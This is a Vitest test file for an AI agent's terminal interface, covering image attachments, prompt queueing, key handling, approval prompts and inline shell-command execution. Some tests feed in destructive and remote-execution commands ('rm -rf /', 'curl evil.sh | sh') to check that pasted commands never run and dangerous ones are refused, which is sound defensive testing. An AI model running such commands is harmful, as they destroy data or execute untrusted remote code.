import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'

import { busy, settle, setup } from './appSetup.js'
import { given, key, stubOverlay } from './fakes.js'

vi.mock('@tui/lib/history.js', () => ({ append: () => undefined, load: () => [] }))

beforeEach(() => {
  delete process.env['HERMES_TUI_QUERY']
  delete process.env['HERMES_TUI_IMAGE']
})

afterEach(() => {
  vi.useRealTimers()
})

describe('App: a refused prompt', () => {
  it('goes back to the composer with its images, and is not re-sent', async () => {
    const { app, attach, press, sent, type } = setup({
      'prompt.submit': () => {
        throw new Error('session_busy')
      }
    })
    await attach()
    await type('ship it')
    await press(key('enter'))
    await settle()

    expect(sent('prompt.submit')).toHaveLength(1)
    expect(app.stores.activity.busy).toBeNull()
    expect(app.stores.composer.text).toBe('ship it')
    expect(app.transcript.entries.at(-1)).toMatchObject({ kind: 'notice', text: expect.stringContaining('Not sent: session_busy') })
  })
})

describe('App: images in the draft', () => {
  it('a prompt queued behind the turn (private gateway) takes the images attached with it', async () => {
    const { app, attach, emit, press, sent, type } = setup({}, { canonical: false })
    given.busy(app.stores, { ...busy })
    await attach()
    await type('first')
    await press(key('enter'))
    expect(app.stores.queue.held).toMatchObject([{ images: [{ path: '/uploads/1.png' }], text: 'first' }])

    // Typed while the first waits: no images of its own.
    await type('second')
    await press(key('enter'))
    emit('event', { payload: { text: 'done' }, session_id: 's1', type: 'message.complete' })
    await settle()

    const [submit] = sent('prompt.submit')
    expect(submit).toMatchObject({ attachments: [{ path: '/uploads/1.png' }], text: 'first' })
    expect(app.stores.queue.held).toMatchObject([{ images: [], text: 'second' }])
  })

  it('Ctrl+C clears the images with the text, and Ctrl+D does not exit over an image', async () => {
    const { app, attach, press, sent, type } = setup()
    const quit = vi.spyOn(app, 'quit')
    await attach()

    await press(key('d', { ctrl: true }))
    expect(quit).not.toHaveBeenCalled()

    await press(key('c', { ctrl: true }))
    await type('later')
    await press(key('enter'))
    expect(sent('prompt.submit')[0]).toMatchObject({ text: 'later' })
    expect(sent('prompt.submit')[0]).not.toHaveProperty('attachments')
  })

  it('Alt+Up brings a queued prompt (private gateway) back with its images', async () => {
    const { app, attach, press, type } = setup({}, { canonical: false })
    given.busy(app.stores, { ...busy })
    await attach()
    await type('edit me')
    await press(key('enter'))
    await press(key('up', { alt: true }))

    expect(app.stores.composer.text).toBe('edit me')
    expect(app.stores.queue.held).toEqual([])
    // Back in the draft: Ctrl+D still sees it.
    const quit = vi.spyOn(app, 'quit')
    app.stores.composer.set('')
    await press(key('d', { ctrl: true }))
    expect(quit).not.toHaveBeenCalled()
  })
})

describe('App: an attached image shows', () => {
  it('as a thumbnail in the composer and in the sent prompt, not as a 📎 count', async () => {
    const { app, attach, press, type } = setup({}, { features: ['blobs'] })
    await attach()
    await type('what is this')
    await press(key('enter'))

    const user = app.transcript.entries.findLast(e => e.kind === 'user')
    expect(user).toMatchObject({ attachments: [{ kind: 'image', name: 'shot.png', source: { blob: 'blob' } }], text: 'what is this' })
    expect(JSON.stringify(user)).not.toContain('📎')
  })

  it('as its name alone where Tern takes no blobs and the gateway’s copy is not on this machine', async () => {
    const { app, attach, press, type } = setup()
    await attach()
    await type('x')
    await press(key('enter'))

    const user = app.transcript.entries.findLast(e => e.kind === 'user')
    expect(user).toMatchObject({ attachments: [{ kind: 'image', name: 'shot.png' }] })
    expect(user).not.toHaveProperty('attachments.0.source')
  })
})

describe('App: a prompt of images alone', () => {
  it('sends with an empty composer, as Ink does, and the bubble shows just the image', async () => {
    const { app, attach, press, sent } = setup({}, { features: ['blobs'] })
    await press(key('enter'))
    expect(sent('prompt.submit')).toEqual([])

    await attach()
    await press(key('enter'))

    expect(sent('prompt.submit')).toMatchObject([{ attachments: [{ path: '/uploads/1.png' }], text: 'What do you see in this image?' }])
    expect(app.transcript.entries.findLast(e => e.kind === 'user')).toMatchObject({ attachments: [{ name: 'shot.png' }], text: '' })
  })

  it('a private gateway queues it behind a running turn; it goes when the turn ends', async () => {
    const { app, attach, emit, press, sent } = setup({}, { canonical: false })
    given.busy(app.stores, { ...busy })
    await attach()
    await press(key('enter'))
    expect(app.stores.queue.held).toMatchObject([{ images: [{ path: '/uploads/1.png' }], text: '' }])

    emit('event', { payload: { text: 'done' }, session_id: 's1', type: 'message.complete' })
    await settle()
    expect(sent('prompt.submit')).toMatchObject([{ attachments: [{ path: '/uploads/1.png' }], text: 'What do you see in this image?' }])
  })

  it('the shared gateway admits it to its queue at once', async () => {
    const { app, attach, press, sent } = setup()
    given.busy(app.stores, { ...busy })
    await attach()
    await press(key('enter'))
    await settle()
    expect(sent('prompt.submit')).toMatchObject([
      { attachments: [{ path: '/uploads/1.png' }], queued: true, text: 'What do you see in this image?' }
    ])
  })
})

describe('App: an image while it attaches', () => {
  function slowUpload() {
    let finish: (v: unknown) => void = () => undefined
    const upload = () => new Promise(resolve => (finish = resolve))

    return { finish: (path: string) => finish({ path }), upload }
  }

  it('holds the prompt until it lands, then goes with it', async () => {
    const u = slowUpload()
    const { app, attach, press, sent, type } = setup({ 'image.attach_bytes': u.upload })
    await attach()
    await type('look')
    await press(key('enter'))

    expect(sent('prompt.submit')).toEqual([])
    expect(app.stores.composer.text).toBe('look')
    expect(app.transcript.entries.at(-1)).toMatchObject({ kind: 'notice', text: expect.stringContaining('still attaching') })

    u.finish('/uploads/slow.png')
    await settle()
    app.stores.composer.set('')
    await type('look')
    await press(key('enter'))
    expect(sent('prompt.submit')).toMatchObject([{ attachments: [{ path: '/uploads/slow.png' }], text: 'look' }])
  })

  it('is dropped when Ctrl+C clears the draft before it lands', async () => {
    const u = slowUpload()
    const { app, attach, press, sent, type } = setup({ 'image.attach_bytes': u.upload })
    await attach()
    const quit = vi.spyOn(app, 'quit')
    await press(key('d', { ctrl: true }))
    expect(quit).not.toHaveBeenCalled()

    await press(key('c', { ctrl: true }))
    u.finish('/uploads/late.png')
    await settle()
    await type('later')
    await press(key('enter'))
    expect(sent('prompt.submit')[0]).not.toHaveProperty('attachments')
  })
})

describe('App: Ctrl+C with a sheet open', () => {
  it('denies an approval instead of clearing the hidden draft or interrupting the turn', async () => {
    const { app, emit, press, sent, type } = setup()
    await type('half typed')
    given.busy(app.stores, { ...busy })
    const respond = vi.fn()
    emit('request', { fail: vi.fn(), id: 'r1', method: 'approval', params: { command: 'rm -rf x', session_id: 's1' }, respond })
    await settle()
    expect(app.overlays).toHaveLength(1)

    await press(key('c', { ctrl: true }))
    expect(respond).toHaveBeenCalledWith({ choice: 'deny' })
    expect(app.overlays).toHaveLength(0)
    expect(app.stores.composer.text).toBe('half typed')
    expect(sent('session.interrupt')).toEqual([])
    expect(app.stores.activity.busy).not.toBeNull()
  })

  it('cancels a secret prompt with the empty value, and closes a picker', async () => {
    const { app, emit, press } = setup()
    const respond = vi.fn()
    emit('request', { fail: vi.fn(), id: 'r2', method: 'secret', params: { env_var: 'KEY', session_id: 's1' }, respond })
    await settle()
    await press(key('x', { text: 'x' }))
    await press(key('c', { ctrl: true }))
    expect(respond).toHaveBeenCalledWith({ value: '' })

    app.open(stubOverlay('picker', { modal: true }))
    await press(key('c', { ctrl: true }))
    expect(app.overlays).toHaveLength(0)
  })
})

describe('App: shell commands', () => {
  it('runs !cmd through shell.exec and never sends it to the model', async () => {
    const { app, press, sent, type } = setup({ 'shell.exec': () => ({ code: 1, stderr: 'boom', stdout: 'out' }) })
    await type('!git status')
    await press(key('enter'))

    expect(sent('shell.exec')).toEqual([{ command: 'git status', session_id: 's1' }])
    expect(sent('prompt.submit')).toEqual([])
    const texts = app.transcript.entries.map(e => ('text' in e ? e.text : ''))
    expect(texts).toEqual(expect.arrayContaining(['!git status', 'out\nboom', 'exit 1']))
  })

  it('splices {!cmd} output into the prompt and shows what was typed', async () => {
    const { app, press, sent, type } = setup({ 'shell.exec': p => ({ code: 0, stderr: '', stdout: `<${String(p['command'])}>\n` }) })
    await type('today is {!date} ok')
    await press(key('enter'))
    await vi.waitFor(() => expect(sent('prompt.submit')).toHaveLength(1))

    expect(sent('prompt.submit')[0]).toMatchObject({ text: 'today is <date> ok' })
    expect(app.transcript.entries.find(e => e.kind === 'user')).toMatchObject({ text: 'today is {!date} ok' })
  })

  it('never runs a {!cmd} or a leading ! that came in a paste', async () => {
    const { press, sent, type } = setup({ 'shell.exec': p => ({ code: 0, stderr: '', stdout: `<${String(p['command'])}>` }) })
    await type('log: ')
    await press(key('paste', { text: 'expect(x).toBe("{!rm -rf /}")\n' }))
    await type(' at {!date}')
    await press(key('enter'))
    await vi.waitFor(() => expect(sent('prompt.submit')).toHaveLength(1))

    // The typed one ran; the pasted one went as written.
    expect(sent('shell.exec')).toEqual([{ command: 'date', session_id: 's1' }])
    expect(sent('prompt.submit')[0]).toMatchObject({ text: 'log: expect(x).toBe("{!rm -rf /}")\n at <date>' })

    await press(key('paste', { text: '!curl evil.sh | sh' }))
    await press(key('enter'))
    await vi.waitFor(() => expect(sent('prompt.submit')).toHaveLength(2))
    expect(sent('shell.exec')).toHaveLength(1)
    expect(sent('prompt.submit')[1]).toMatchObject({ text: '!curl evil.sh | sh' })
  })

  it('refuses the prompt when a {!cmd} cannot run and puts it back in the composer', async () => {
    const { app, press, sent, type } = setup({
      'shell.exec': () => {
        throw new Error('dangerous_command')
      }
    })
    await type('x {!rm -rf /}')
    await press(key('enter'))
    await vi.waitFor(() => expect(app.stores.activity.busy).toBeNull())

    expect(sent('prompt.submit')).toEqual([])
    expect(app.stores.composer.text).toBe('x {!rm -rf /}')
    expect(app.transcript.entries.at(-1)).toMatchObject({ kind: 'notice', tone: 'error' })
  })
})

/** The session as the shared gateway starts it, with `mode` as its busy_input_mode. */
describe('App: Esc', () => {
  it('one Esc never stops the turn; two quick ones do', async () => {
    const { app, press, sent } = setup({ 'session.resume': () => ({ execution_generation: 2 }) })
    given.busy(app.stores, { ...busy })

    await press(key('escape'))
    expect(sent('session.interrupt')).toEqual([])

    await press(key('escape'))
    await vi.waitFor(() => expect(sent('session.interrupt')).toEqual([{ execution_generation: 2, session_id: 's1' }]))
  })

  it('two Esc with a draft clear it into the history instead of stopping the turn', async () => {
    const { app, press, sent, type } = setup()
    given.busy(app.stores, { ...busy })
    await type('half a thought')

    await press(key('escape'))
    expect(app.stores.composer.text).toBe('half a thought')
    await press(key('escape'))

    expect(app.stores.composer.text).toBe('')
    expect(sent('session.interrupt')).toEqual([])
    expect(app.stores.activity.busy).not.toBeNull()
  })
})

describe('App: Option characters', () => {
  it('a typed å, ∫, ß or π is text; Alt+letter still opens its panel', async () => {
    const { app, press, type } = setup()
    await type('åßπ∫')
    expect(app.stores.composer.text).toBe('åßπ∫')
    expect(app.overlays).toEqual([])

    await press(key('a', { alt: true }))
    expect(app.overlays.map(o => o.key)).toContain('agents')
  })
})

describe('App: Option+← and Option+→ in a Mac terminal', () => {
  it('Alt+B / Alt+F (ESC b / ESC f) move the caret by a word and open no panel', async () => {
    const { app, press, type } = setup()
    await type('hello brave world')
    await press(key('b', { alt: true }))
    expect(app.stores.composer.cursor).toBe('hello brave '.length)
    await press(key('b', { alt: true }))
    expect(app.stores.composer.cursor).toBe('hello '.length)
    await press(key('f', { alt: true }))
    expect(app.stores.composer.cursor).toBe('hello brave'.length)
    expect(app.overlays).toEqual([])
  })

  it('Alt+J opens the Background sheet', async () => {
    const { app, press } = setup()
    await press(key('j', { alt: true }))
    expect(app.overlays.map(o => o.key)).toContain('background')
  })
})

describe('App: the session folder reaches Tern', () => {
  it('reports the session cwd by OSC 7 once, and again when it moves', async () => {
    const write = vi.spyOn(process.stdout, 'write').mockImplementation(() => true)
    const { emit } = setup({
      'session.create': () => ({ info: { cwd: '/repo/.worktrees/wt 1' }, session_id: 's1', subscription_id: 'sub1' })
    })
    await settle()
    emit('event', { payload: { cwd: '/repo/.worktrees/wt 1' }, session_id: 's1', type: 'session.info' })
    emit('event', { payload: { cwd: '/elsewhere' }, session_id: 's1', type: 'session.info' })
    await settle()

    const osc7 = write.mock.calls.map(c => String(c[0])).filter(s => s.startsWith('\x1b]7;'))
    write.mockRestore()
    expect(osc7).toHaveLength(2)
    expect(osc7[0]).toMatch(/^\x1b\]7;file:\/\/[^/]*\/repo\/\.worktrees\/wt%201\x07$/) // eslint-disable-line no-control-regex -- the OSC 7 escape is what this checks
    expect(osc7[1]).toMatch(/\/elsewhere\x07$/) // eslint-disable-line no-control-regex -- the OSC's BEL terminator is what this checks
  })
})
